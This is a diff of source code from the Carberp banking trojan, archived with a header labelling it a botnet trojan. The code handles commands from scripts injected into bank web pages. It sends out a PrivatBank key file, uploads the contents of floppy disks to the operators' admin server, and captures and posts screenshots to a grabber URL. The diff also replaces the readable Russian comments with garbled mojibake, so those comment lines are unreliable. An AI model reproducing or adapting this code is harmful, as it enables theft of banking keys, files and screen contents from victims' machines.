@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -28,15 +39,15 @@ typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Param
 
 
 //----------------------------------------------------------
-//  ProcessHTMLInjectRequest - Функция обрабатывает адрес
-//  запроса и, в случае если это обращение из ява скрипта
-//  внедрённого в страницу, выполняет необходимые действия
+//  ProcessHTMLInjectRequest - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
-//  URL - Обрабатываемый адрес
+//  URL - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //
-//  CloseRequest - Функция установит параметр в истину,
-//                 если запрос обработан и дальше не стоит
-//                 его пропускать
+//  CloseRequest - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+//                 пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//                 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //----------------------------------------------------------
 bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequest)
 {
@@ -48,37 +59,37 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 	if (STRA::IsEmpty(URL))
 		return false;
 
-	// Определяем имя команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int Pos = STRA::Pos(URL, "://");
 	if (Pos >= 0)
 		URL += Pos + 3;
 
-	// Пропускаем имя домена
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	URL = STRA::Scan(URL, '/');
 	if (!URL) return false;
 	URL++;
 
 
-	// Определяем начало строки параметров
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Params = STRA::Scan(URL, '/');
 
-	// Определяем длину команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int CmdLen = (Params) ? (Params - URL) : STRA::Length(URL);
 
 
-	// в случае остутствия данных в домене FireFox автоматически
-	// дополняет команду строками www и .com
-	// т.е. наша команда получает вид www.command.com
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ FireFox пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ www пїЅ .com
+	// пїЅ.пїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ www.command.com
  
 
-	// Обрабатываем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Params) Params++;
 
 	DWORD CmdHash = STRA::Hash(URL, CmdLen, true);
 
 	bool DecodeFromUTF8 = true;
 
-	// Проверяем хэш команды
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	THTMLInjectRequestCommand Command = NULL;
 
 	if (CmdHash == 0x9E19D547 /* keypath */)
@@ -94,7 +105,7 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 	}
 
 
-	// Выполняем команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool Result = false;  
 	if (Command)
 	{
@@ -104,7 +115,7 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 		string CmdStr;
 		CmdStr.Copy(URL, 0, CmdLen);
 
-		// Преобразовываем из UTF8 в Ansi
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ UTF8 пїЅ Ansi
 		string EP = URLDecode(Params);
 
 		if (DecodeFromUTF8)
@@ -115,7 +126,7 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 		}
 
 //		string F;
-//		F.Format("Выполняется команда инжекта: %s; Параметры: %s", CmdStr.t_str(), EP.t_str());
+//		F.Format("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s; пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s", CmdStr.t_str(), EP.t_str());
 //		pMessageBoxA(0, F.t_str(), 0, 0);
 //		pOutputDebugStringA(F.t_str());
 
@@ -129,7 +140,7 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 
 
 //---------------------------------------------------
-//  Функция отправляет файл ключа приватбанка
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 void SendPrivatBankKey(const char* Command, const char* Params)
 {
@@ -143,7 +154,7 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 #endif
 
 
-	// Добавляем фал в архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //	string FN = File::GetTempName2A();
 //
 //	HCAB Cab = CreateCab(FN.t_str());
@@ -161,8 +172,8 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 
 
 //---------------------------------------------------
-//  Функция отправляет содержимое флоппидисков на
-//  сервер админки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 void SendFloppyDiskToServer(const char* Command, const char* Params)
 {
@@ -172,7 +183,7 @@ void SendFloppyDiskToServer(const char* Command, const char* Params)
 	{
 		DWORD EMode = (DWORD)pSetErrorMode(SEM_FAILCRITICALERRORS);
 
-		// Добавляем диска "A" и "B" в каб
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ "A" пїЅ "B" пїЅ пїЅпїЅпїЅ
 		bool Added = AddDirToCab(Cab, "a:\\", "drive_a");
 
 		if (AddDirToCab(Cab, "b:\\", "drive_b"))
@@ -192,13 +203,13 @@ void SendFloppyDiskToServer(const char* Command, const char* Params)
 
 
 //-----------------------------------------------
-//  Функция потока создания скриншота и отправки
-//  его на сервер
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------
 #ifdef AzConfigH
 DWORD WINAPI DoSendSendScreenshot(string *Params)
 {
-	// Определяем имя системы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string System;
 	string Comment;
 	PCHAR Start = STRA::Scan(Params->t_str(), '/');
@@ -215,12 +226,12 @@ DWORD WINAPI DoSendSendScreenshot(string *Params)
 		System  = "screens";
 	}
 
-	// Создаём скрин
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     string FN = File::GetTempName2A();
 	if (!ScreenShot::Make(0, 0, 0, 0, 0, NULL, FN.t_str()))
 		return 0;
 
-	// Отправляем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	string URL = GetAzGrabberURL(System, "save_sf");
 	if (!URL.IsEmpty())
 	{
@@ -232,7 +243,7 @@ DWORD WINAPI DoSendSendScreenshot(string *Params)
 		HTTP.Post(URL.t_str(), &Data);
     }
 
-	// Очищаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	delete Params;
 	pDeleteFileA(FN.t_str());
 	return 0;
@@ -241,8 +252,8 @@ DWORD WINAPI DoSendSendScreenshot(string *Params)
 
 
 //-----------------------------------------------
-//  SendSendScreenshot - Функция делает снимок
-//  экрана и отправляет его на сервер
+//  SendSendScreenshot - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //-----------------------------------------------
 void SendSendScreenshot(const char* Command, const char* Params)
 {
